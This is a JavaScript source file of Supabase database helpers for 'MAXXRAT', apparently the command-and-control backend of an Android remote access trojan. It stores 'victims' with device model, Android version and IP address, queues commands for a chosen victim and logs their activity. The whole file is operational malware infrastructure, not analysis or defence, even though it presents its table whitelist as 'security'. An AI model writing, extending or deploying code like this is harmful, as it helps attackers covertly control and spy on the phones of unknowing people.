// Supabase Database functions with enhanced security and error handling
import { supabase } from './supabase-app.js';

// Enhanced database functions with proper error handling and security

// Generic insert function with validation
export async function insertData(table, data) {
    try {
        // Validate table name to prevent SQL injection
        const allowedTables = ['victims', 'commands', 'logs'];
        if (!allowedTables.includes(table)) {
            throw new Error(`Invalid table name: ${table}`);
        }

        const { data: result, error } = await supabase
            .from(table)
            .insert(data)
            .select();

        if (error) throw error;
        return { success: true, data: result };
    } catch (error) {
        console.error(`Error inserting data into ${table}:`, error);
        return { success: false, error: error.message };
    }
}

// Generic select function with filtering
export async function getData(table, options = {}) {
    try {
        const allowedTables = ['victims', 'commands', 'logs'];
        if (!allowedTables.includes(table)) {
            throw new Error(`Invalid table name: ${table}`);
        }

        let query = supabase.from(table).select(options.select || '*');

        // Apply filters
        if (options.filters) {
            Object.entries(options.filters).forEach(([key, value]) => {
                query = query.eq(key, value);
            });
        }

        // Apply ordering
        if (options.orderBy) {
            query = query.order(options.orderBy.column, {
                ascending: options.orderBy.ascending !== false
            });
        }

        // Apply limit
        if (options.limit) {
            query = query.limit(options.limit);
        }

        const { data, error } = await query;

        if (error) throw error;
        return { success: true, data: data || [] };
    } catch (error) {
        console.error(`Error fetching data from ${table}:`, error);
        return { success: false, error: error.message, data: [] };
    }
}

// Enhanced update function
export async function updateData(table, id, data) {
    try {
        const allowedTables = ['victims', 'commands', 'logs'];
        if (!allowedTables.includes(table)) {
            throw new Error(`Invalid table name: ${table}`);
        }

        const { data: result, error } = await supabase
            .from(table)
            .update(data)
            .eq('id', id)
            .select();

        if (error) throw error;
        return { success: true, data: result };
    } catch (error) {
        console.error(`Error updating data in ${table}:`, error);
        return { success: false, error: error.message };
    }
}

// Enhanced delete function
export async function deleteData(table, id) {
    try {
        const allowedTables = ['victims', 'commands', 'logs'];
        if (!allowedTables.includes(table)) {
            throw new Error(`Invalid table name: ${table}`);
        }

        const { error } = await supabase
            .from(table)
            .delete()
            .eq('id', id);

        if (error) throw error;
        return { success: true };
    } catch (error) {
        console.error(`Error deleting data from ${table}:`, error);
        return { success: false, error: error.message };
    }
}

// Specialized functions for MAXXRAT

// Get victims with real-time updates
export async function getVictims(options = {}) {
    return await getData('victims', {
        select: 'id, device_name, device_model, android_version, last_seen, ip_address, status',
        orderBy: { column: 'last_seen', ascending: false },
        limit: options.limit || 50,
        ...options
    });
}

// Send command to victim
export async function sendCommandToVictim(victimId, commandType, parameters = {}) {
    const commandData = {
        victim_id: victimId,
        command_type: commandType,
        parameters: JSON.stringify(parameters),
        status: 'pending',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
    };

    return await insertData('commands', commandData);
}

// Get commands for victim
export async function getVictimCommands(victimId, options = {}) {
    return await getData('commands', {
        filters: { victim_id: victimId },
        orderBy: { column: 'created_at', ascending: false },
        limit: options.limit || 100,
        ...options
    });
}

// Log activity
export async function logActivity(victimId, activityType, details = {}) {
    const logData = {
        victim_id: victimId,
        activity_type: activityType,
        details: JSON.stringify(details),
        timestamp: new Date().toISOString(),
        ip_address: details.ip || null
    };

    return await insertData('logs', logData);
}

// Get activity logs
export async function getActivityLogs(victimId, options = {}) {
    return await getData('logs', {
        filters: victimId ? { victim_id: victimId } : {},
        orderBy: { column: 'timestamp', ascending: false },
        limit: options.limit || 200,
        ...options
    });
}

// Update victim status
export async function updateVictimStatus(victimId, status, additionalData = {}) {
    const updateData = {
        status: status,
        last_seen: new Date().toISOString(),
        ...additionalData
    };

    return await updateData('victims', victimId, updateData);
}
